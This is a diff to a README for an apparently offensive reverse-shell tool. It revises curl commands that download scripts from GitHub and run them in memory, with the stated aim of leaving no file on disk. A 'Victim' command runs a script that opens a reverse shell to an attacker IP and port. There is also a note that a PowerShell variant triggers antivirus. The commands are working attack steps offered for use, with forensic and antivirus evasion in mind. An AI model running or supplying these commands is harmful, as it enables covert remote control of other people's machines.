@@ -36,20 +36,19 @@ On the target machine, provide both the attacker's IP and the listening port.
 ## 💡 Quick Tips
 ## Execution via Remote Pipe (Attacker)
 
-Option A: Python Interactive Listener
-```bash
-curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/python_tty.sh | bash -s -- 4444
-```
-
 Option B: Bash/Script Interactive Listener
 ```bash
-curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/bash_tty.sh | bash -s -- 4444
+# This downloads the script and runs it in the current shell context without holding the pipe open
+source <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/bash_tty.sh) 4444
+
 ```
 
 ## Execution via Remote Pipe (Victim)
 If you cannot upload the script to the target machine, you can fetch it directly from this repository and execute it in memory without leaving a file on disk:
 ```bash
-curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh | bash -s -- 10.0.13.7 4444
+#Instead of piping (|), use this. It downloads the script into a virtual file descriptor and executes it. This leaves stdin completely open for the reverse shell to talk to you.
+bash <(curl -sSL https://raw.githubusercontent.com/x86david/multiplatform_kali_interactive_tty/master/victim.sh) 10.0.13.7 4444
+
 ```
 This one triggers the antivirus....
 ```powershell
